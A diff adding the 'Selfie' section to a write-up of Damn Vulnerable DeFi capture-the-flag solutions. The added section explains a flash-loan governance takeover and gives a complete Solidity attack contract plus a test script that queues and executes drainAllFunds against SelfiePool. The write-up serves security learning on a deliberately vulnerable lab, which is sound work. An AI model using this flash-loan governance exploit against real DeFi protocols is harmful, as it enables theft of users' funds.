@@ -402,3 +402,81 @@ it('Exploit', async function () {
 });
 // ...
 ```
+
+## 6 - Selfie
+
+Goal of this challenge is to drain all funds from **SelfiePool.sol**. It looks kind of obvious here:
+
+```solidity
+function drainAllFunds(address receiver) external onlyGovernance {
+    uint256 amount = token.balanceOf(address(this));
+    token.transfer(receiver, amount);
+
+    emit FundsDrained(receiver, amount);
+}
+```
+
+The tricky part is to pass `onlyGovernance` modifier that requires transaction sender to be **SimpleGovernance.sol** contract.
+Governance contract is designed in a way that anyone can submit an action (transaction) and execute it if the action caller has enough votes. What it actually means is that we have to own more than half of total token supply. That is easy since we have lender that offers 75% of whole supply in flash loans.
+
+So, to exploit this we will need new **SelfieAttack.sol** contract. It will request the flash loan and queue an action that calls **SelfiePool.sol's** `drainAllFunds`. After paying back the loan, we will wait for queued action to be available for execution since contract requires that at least 2 days have passed.
+
+Solution code:
+
+**SelfieAttack.sol**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../selfie/SelfiePool.sol";
+import "../DamnValuableTokenSnapshot.sol";
+
+contract SelfieAttack {
+    SelfiePool immutable pool;
+    DamnValuableTokenSnapshot immutable governanceToken;
+    address immutable owner;
+
+    constructor(address _pool, address _governanceToken) {
+        pool = SelfiePool(_pool);
+        governanceToken = DamnValuableTokenSnapshot(_governanceToken);
+        owner = msg.sender;
+    }
+
+    function attack() external {
+        uint256 amount = pool.token().balanceOf(address(pool));
+        pool.flashLoan(amount);
+    }
+
+    function receiveTokens(address token, uint256 amount) external {
+        governanceToken.snapshot();
+        pool.governance().queueAction(
+            address(pool),
+            abi.encodeWithSignature("drainAllFunds(address)", owner),
+            0
+        );
+        governanceToken.transfer(address(pool), amount);
+    }
+}
+```
+
+**selfie.challenge.js**
+
+```js
+it('Exploit', async function () {
+  /** CODE YOUR EXPLOIT HERE */
+  const AttackFactory = await ethers.getContractFactory(
+    'SelfieAttack',
+    attacker
+  );
+  const attackContract = await AttackFactory.deploy(
+    this.pool.address,
+    this.token.address
+  );
+  await attackContract.attack();
+
+  await ethers.provider.send('evm_increaseTime', [2 * 24 * 3600]);
+
+  await this.governance.connect(attacker).executeAction(1);
+});
+```
